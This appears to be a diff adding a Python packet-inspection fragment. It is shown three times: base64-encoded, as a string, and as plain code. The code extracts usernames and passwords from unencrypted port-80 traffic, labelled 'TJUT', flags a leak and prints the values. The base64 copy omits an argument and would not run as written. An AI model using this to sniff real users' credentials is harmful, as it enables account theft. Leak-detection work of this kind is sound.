@@ -1,0 +1,11 @@
+aWYgZHBvcnQ9PSI4MCI6CglyYXc9cmF3WzA6LTVdCgl1c2VyID0gcmUuZmluZGFsbCgidXNlcm5hbWU9KC4qKSYiKQoJcGFzc3dvcmQgPSByZS5maW5kYWxsKCJwYXNzd29yZD0oLiopJiIpCglpZiB1c2VyIGFuZCBwYXNzd29yZDoKCQlpbmZvID0gaW5mbysiVEpVVCB1c2VybmFtZToiK3VzZXJbMF0KCQlpbmZvID0gaW5mbysiO3Bhc3N3b3JkOiIrcGFzc3dvcmRbMF0KCQlpc0xlYWs9VHJ1ZQoJCXByaW50KGluZm8p
+'''if dport=="80":\n\traw=raw[0:-5]\n\tuser = re.findall("username=(.*)&",raw)\n\tpassword = re.findall("password=(.*)&",raw)\n\tif user and password:\n\t\tinfo = info+"TJUT username:"+user[0]\n\t\tinfo = info+";password:"+password[0]\n\t\tisLeak=True\n\t\tprint(info)'''
+if dport=="80":
+	raw=raw[0:-5]
+	user = re.findall("username=(.*)&",raw)
+	password = re.findall("password=(.*)&",raw)
+	if user and password:
+		info = info+"TJUT username:"+user[0]
+		info = info+";password:"+password[0]
+		isLeak=True
+		print(info)
